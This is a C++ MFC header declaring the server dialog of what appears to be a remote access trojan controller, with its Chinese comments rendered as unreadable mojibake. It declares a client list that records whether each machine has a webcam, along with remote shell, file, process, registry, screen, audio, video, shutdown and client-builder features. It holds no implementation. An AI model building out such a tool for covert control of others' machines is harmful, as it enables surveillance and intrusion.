
// XsServerDlg.h : ͷ�ļ�
//

#pragma once
#include "afxcmn.h"
#include "TrueColorToolBar.h"
#include "_ConfigFile.h"
#include "_IOCPServer.h"
#include "Common.h"
#include "DlgRemoteMessage.h"
#include "DlgProcessManager.h"
#include "DlgCmdManager.h"
#include "DlgWindowManager.h"
#include "DlgRemoteControll.h"
#include "DlgFileManager.h"
#include "DlgAudioManager.h"
#include "DlgServiceManager.h"
#include "DlgRegisterManager.h"
#include "DlgCreateClient.h"



#define UM_NOTIFY_ICON_DATA   WM_USER + 0x10

typedef struct 
{
	char*  TitleData;    //�б�����
	int    TitleWidth;   //�б���
}COLUMN_DATA;

// CXsServerDlg �Ի���
class CXsServerDlg : public CDialogEx
{
// ����
public:
	CXsServerDlg(CWnd* pParent = NULL);	// ��׼���캯��

// �Ի�������
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_XSSERVER_DIALOG };
#endif

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);	// DDX/DDV ֧��


// ʵ��
protected:
	HICON m_hIcon;

	// ���ɵ���Ϣӳ�亯��
	virtual BOOL OnInitDialog();
	afx_msg void OnSysCommand(UINT nID, LPARAM lParam);
	afx_msg void OnPaint();
	afx_msg HCURSOR OnQueryDragIcon();
	DECLARE_MESSAGE_MAP()
private:
	CBitmap m_Bitmap[30];
	CStatusBar         m_StatusBar;
	CTrueColorToolBar  m_TrueColorToolBar;
	NOTIFYICONDATA     m_NotifyIconData;   //���̽ṹ��
	USHORT             m_ListenPort;
	ULONG              m_MaxConnection;
public:
	VOID CXsServerDlg::InitListControl();     //�б�
	VOID CXsServerDlg::InitSolidMenu();       //��̬�˵�
	VOID CXsServerDlg::ShowDialogMessage(BOOL IsOk, CString Message);
	VOID CXsServerDlg::InitStatusBar();       //״̬bar
	VOID CXsServerDlg::InitTrueToolBar();     //��ʹ�����

	//��̬����ͨ���������
	VOID CXsServerDlg::ServerStart();

	//�������
	void CXsServerDlg::InitNotifyIconData();  
	afx_msg void OnNotifyIconData(WPARAM wParam, LPARAM lParam);

	//�ͻ���������Ϣ����
	afx_msg LRESULT OnClientLogin(WPARAM wParam, LPARAM lParam);
	VOID CXsServerDlg::AddListCtrlServerOnline(CString ClientAddress,
		CString HostName,
		CString OSName, CString ProcessorNameString, CString IsWebCameraExist,
		CString WebSpeed,CONTEXT_OBJECT* ContextObject);

	//��ͻ���Զ����Ϣ
	afx_msg LRESULT OnOpenRemoteMessageDialog(WPARAM wParam, LPARAM lParam);

	//�ն˹���
	afx_msg VOID OnButtonCmdManager();
	afx_msg LRESULT CXsServerDlg::OnOpenCmdManagerDialog(WPARAM wParam, LPARAM lParam);

	
	//���ڹ���
	afx_msg VOID OnButtonWindowManager();
	afx_msg LRESULT CXsServerDlg::OnOpenWindowManagerDialog(WPARAM wParam, LPARAM lParam);
	//Զ�̿���
	afx_msg VOID OnButtonRemoteControll();
	afx_msg LRESULT CXsServerDlg::OnOpenRemoteControllDialog(WPARAM wParam, LPARAM lParam);
	//�ļ�����
	afx_msg VOID OnButtonFileManager();
	afx_msg LRESULT CXsServerDlg::OnOpenFileManagerDialog(WPARAM wParam, LPARAM lParam);
	//��������
	afx_msg VOID OnButtonAudioManager();
	afx_msg LRESULT CXsServerDlg::OnOpenAudioManagerDialog(WPARAM wParam, LPARAM lParam);
	//ϵͳ����
	afx_msg VOID OnButtonCleanManager();
	//��Ƶ����
	afx_msg VOID OnButtonVideoManager();
	afx_msg LRESULT CXsServerDlg::OnOpenVideoManagerDialog(WPARAM wParam, LPARAM lParam);
	//�������
	afx_msg VOID OnButtonServiceManager();
	LRESULT CXsServerDlg::OnOpenServiceManagerDialog(WPARAM wParam, LPARAM lParam);
	//ע������
	afx_msg VOID OnButtonRegisterManager();
	LRESULT CXsServerDlg::OnOpenRegisterManagerDialog(WPARAM wParam, LPARAM lParam);
	//����˹���
	afx_msg VOID OnButtonServerManager();
	//�ͻ��˹���
	afx_msg VOID OnButtonCreateClient();
	//����
	afx_msg VOID OnButtonServerAbout();

	//���ڻص�
	static VOID CALLBACK CXsServerDlg::WindowsNotifyProcedure(PCONTEXT_OBJECT ContextObject);
	static VOID CXsServerDlg::WindowHandleIO(PCONTEXT_OBJECT ContextObject);

	//���̹�����Ϣ
	afx_msg VOID OnButtonProcessManager();
	afx_msg LRESULT CXsServerDlg::OnOpenProcessManagerDialog(WPARAM wParam, LPARAM lParam);


public:
	CListCtrl m_CListCtrl_Server_Dialog_Online;
	CListCtrl m_CListCtrl_Server_Dialog_Message;

	//�������˵�
	afx_msg void OnMenuServerDialogSet();
	afx_msg void OnMenuServerDialogExit();
	afx_msg void OnMenuServerDialogAdd();

	afx_msg void OnNMRClickListServerDialogOnline(NMHDR *pNMHDR, LRESULT *pResult);

	//OnlineListControl�˵�
	afx_msg void OnMenuServerDialogOnlineListDisconnection();
	afx_msg void OnMenuServerDialogOnlineListRemoteMessage();
	afx_msg void OnMenuServerDialogOnlineListRemoteShutdown();
	VOID CXsServerDlg::SendingSelectedCommand(PBYTE BufferData, ULONG BufferLength);


	afx_msg void OnSize(UINT nType, int cx, int cy);
	afx_msg void OnClose();
	afx_msg void OnNotifyIconDataShow();
	afx_msg void OnNotifyIconDataExit();
};
